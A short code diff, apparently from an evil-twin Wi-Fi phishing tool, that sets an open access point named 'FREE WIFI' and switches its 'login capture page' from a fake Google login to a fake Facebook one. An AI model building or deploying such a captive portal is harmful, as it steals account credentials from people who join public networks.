@@ -29,8 +29,8 @@ const char *ssid="FREE WIFI";
  * LOGIN CAPTURE PAGE
  * ***********************
  */
- // Can be Google, Facebook or Yahoo
-#define captivePortalPage GOOGLE_HTML
+ // Facebook
+#define captivePortalPage FACEBOOK_HTML
  // FACEBOOK_HTML
 
 // Basic configuration using common network setups (usual DNS port, IP and web server port)
